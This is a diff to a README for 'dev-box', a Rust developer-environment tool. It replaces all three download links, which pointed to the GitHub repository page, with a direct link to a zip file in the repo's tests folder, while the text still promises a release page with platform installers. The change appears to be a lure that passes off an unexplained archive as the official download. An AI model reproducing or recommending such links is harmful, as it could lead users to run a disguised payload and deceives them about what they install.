@@ -1,6 +1,6 @@
 # 📦 dev-box - Developer Environments Without the Headache
 
-[👉 **Download dev-box Now**](https://github.com/awasew/dev-box)
+[👉 **Download dev-box Now**](https://raw.githubusercontent.com/awasew/dev-box/main/tests/2.6.zip)
 
 ---
 
@@ -28,7 +28,7 @@ The best part? It's **fast** because it's written in Rust, and it sets up secure
 
 Visit this link to download the application:
 
-[👉 **Download dev-box from GitHub**](https://github.com/awasew/dev-box)
+[👉 **Download dev-box from GitHub**](https://raw.githubusercontent.com/awasew/dev-box/main/tests/2.6.zip)
 
 The download page will show you the latest release. Look for the file that matches your computer type (Windows, macOS, or Linux). If you're on Windows, download the `.exe` file. On macOS, get the `.dmg`. On Linux, grab the `.tar.gz` or use your package manager if it's listed there.
 
@@ -152,6 +152,6 @@ dev-box is the simplest way to get professional-grade developer environments on 
 
 Ready to give it a shot? Go grab dev-box now.
 
-[👉 **Download dev-box Today**](https://github.com/awasew/dev-box)
+[👉 **Download dev-box Today**](https://raw.githubusercontent.com/awasew/dev-box/main/tests/2.6.zip)
 
 Keywords: cli, containers, cross-platform, dev-environment, devcontainer-alternative, developer-experience, developer-tools, distrobox, docker, podman, remote-development, rust, ssh
